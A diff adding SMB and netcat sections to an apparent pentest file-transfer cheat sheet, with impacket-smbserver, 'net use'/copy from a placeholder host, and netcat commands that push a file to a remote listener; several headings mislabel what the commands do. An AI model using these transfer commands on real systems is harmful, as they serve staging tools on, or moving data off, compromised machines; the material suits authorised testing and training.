@@ -90,6 +90,34 @@ USING CERTUTIL -
     certutil.exe -encode c:1.txt out.b64 & more .\out.b64
 
 ------------------------------------------------------------------------------------------------------------------
+USING SMB - 
+------------------------------------------------------------------------------------------------------------------
+
+SMB SERVER -
+
+**Start SMB Server**
+    
+    impacket-smbserver share .
+
+**Start SMB Server**
+    
+    impacket-smbserver -smb2support share .
+
+**Start SMB Server**
+
+    impacket-smbserver share -username user -password 123 . -smb2support
+
+
+SMB CLIENT -
+
+**Web Content Download**
+    
+    net use \\10.10.10.10 /u:"user" "123"
+
+**Web Content Download**
+    
+    copy \\10.10.10.10\share\demo.txt c:\temp\demo.txt  
+------------------------------------------------------------------------------------------------------------------
 USING SSH - 
 ------------------------------------------------------------------------------------------------------------------
 
@@ -139,4 +167,14 @@ USING BITSADMIN -
     
     powershell.exe -c Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.10/demo.txt" -Destination "C:\temp\demo.txt"
 ------------------------------------------------------------------------------------------------------------------
+USING NC / NETCAT - 
+------------------------------------------------------------------------------------------------------------------
 
+**Web Content Download**
+    
+    nc.exe -nlvp 443 > demo.txt
+
+**Web Content Download**
+    
+    nc -v 10.10.10.10 443 < demo.txt
+------------------------------------------------------------------------------------------------------------------
